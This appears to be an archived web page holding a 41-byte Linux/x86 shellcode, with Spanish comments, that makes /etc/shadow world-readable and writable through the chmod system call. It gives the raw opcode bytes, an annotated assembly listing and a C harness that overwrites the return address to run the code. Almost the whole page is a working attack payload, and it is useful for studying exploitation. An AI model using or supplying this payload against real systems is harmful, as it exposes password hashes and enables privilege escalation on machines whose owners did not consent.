<html><head><title>Linux/x86 - chmod 666 /etc/shadow 41 bytes</title>
<meta http-equiv="Content-Type" content="text/html; charset=ISO-8859-1" />
<meta http-equiv="Content-Language" content="en" />
</head>


<pre>
/*
 * s0t4ipv6@shellcode.com.ar
 * 0x04abril0x7d2
 * 
 * int sys_chmod(const char * filename, mode_t mode)
 * {...}
 * 
 * Utilizando la interrupcion 15(chmod), asignando el octal 0666
 * al archivo deseado. En este caso /etc/shadow
 * 
 * Hice unas modificaciones en el codigo y solo pude reducir la shellcode en 1.
 * por el codigo mailme.
 *	&quot;\x31\xdb\x68\x64\x6f\x77\x53\x68\x2f\x73\x68\x61\x68\x2f\x65&quot;
 *	&quot;\x74\x63\x89\xe3\x31\xc9\x88\x4c\x24\x0b\x66\xb9\xb6\x01\x31&quot;
 *	&quot;\xc0\xb0\x0f\xcd\x80\x31\xc0\x40\xcd\x80&quot;;
 *
*/

#include &lt;stdio.h&gt;

// Shellcode			//	Asm Code		// Main Interval
char shellcode[]=
&quot;\xeb\x17&quot;			//	jmp     0x17		[3 ; 4]
&quot;\x5e&quot;				//	popl    %esia		[5]
&quot;\x31\xc9&quot;			//	xorl    %ecx, %ecx	[6 ; 7]
&quot;\x88\x4e\x0b&quot;			//      movb    %ecx, 0xb(%esi)	[8; 10]
&quot;\x8d\x1e&quot;			//	leal    (%esi), %ebx	[11;12]
&quot;\x66\xb9\xb6\x01&quot;		//	movw    $0x1b6, %cx     // asigno a cx el equivalente en hex al octal 0666
&quot;\x31\xc0&quot;			//	xorl    %eax, %eax	[17;18]
&quot;\xb0\x0f&quot;			//      movb    $0xf, %al       // Interrupcion 15 (chmod)
&quot;\xcd\x80&quot;			//      int     $0x80		[21;22]
&quot;\x31\xc0&quot;			//	xorl    %eax, %eax      // salida
&quot;\x40&quot;				//	inc     %eax		[25]
&quot;\xcd\x80&quot;			//      int     $0x80		[26;27]
&quot;\xe8\xe4\xff\xff\xff&quot;		//      call    -0x1c
&quot;/etc/shadow&quot;;

main() {
	int *ret;
	ret=(int *)&amp;ret+2;
	printf(&quot;Shellcode lenght=%d\n&quot;,strlen(shellcode));
	(*ret) = (int)shellcode;
}


<body><script type="text/javascript">
var gaJsHost = (("https:" == document.location.protocol) ? "https://ssl." : "http://www.");
document.write(unescape("%3Cscript src=%27" + gaJsHost + "google-analytics.com/ga.js%27 type=%27text/javascript%27%3E%3C/script%3E"));
</script>

<script type="text/javascript">
try {
var pageTracker = _gat._getTracker("UA-6809519-1");
pageTracker._trackPageview();
} catch(err) {}</script></body></html>
